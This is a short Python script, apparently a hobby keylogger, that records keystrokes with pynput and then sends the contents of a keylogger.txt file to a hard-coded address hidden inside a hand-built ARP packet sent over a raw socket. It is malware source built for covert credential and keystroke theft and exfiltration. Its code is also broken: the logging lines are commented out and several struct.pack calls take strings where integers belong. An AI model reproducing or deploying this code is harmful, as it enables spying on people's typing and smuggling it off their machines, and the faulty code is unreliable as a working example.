from pynput import keyboard 
from pynput.keyboard import Listener , Key
from time import time, ctime
import struct
import socket
#f = open('keylogger.txt','a')

def input(key):
    log = []
    log.append(key)
    t = time()
    #f.writelines(ctime(t)+" : "+str(log)+"\n")

def outside(key):
    if key == Key.esc:
        #f.close() 
        quit()

with Listener(on_press=input , on_release=outside) as listener:
    listener.join()

f = open('keylogger.txt', 'r')
message = f.read() 
f.close()

rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
rawSocket.bind(("eth0", socket.htons(0x0800)))

eth_hdr = struct.pack("!6s6sH", "\xbb\xbb\xbb\xbb\xbb\xbb", "\xaa\xaa\xaa\xaa\xaa\xaa", "\x08\x06") # 0x0806 for ARP

src_ip = socket.inet_aton("10.10.0.15" )
dst_ip = socket.inet_aton("192.168.0.107")

#ARP Header (l’entête ARP)
#Protocol type => 0x0800 – IP
#Hardware Address Length => 06 – Ethernet
#Protocol Address Length => 04 – IP v4
#Operation => 01 – Request

arp_hdr = struct.pack("!HHBBH6s4s6s4s", "\x00\x01", "\x08\x00", "\x06", "\x04", "\x00\x01", "\xaa\xaa\xaa\xaa\xaa\xaa", src_ip, "\xbb\xbb\xbb\xbb\xbb\xbb", dst_ip)

pkt = eth_hdr + arp_hdr + message
rawSocket.send(pkt)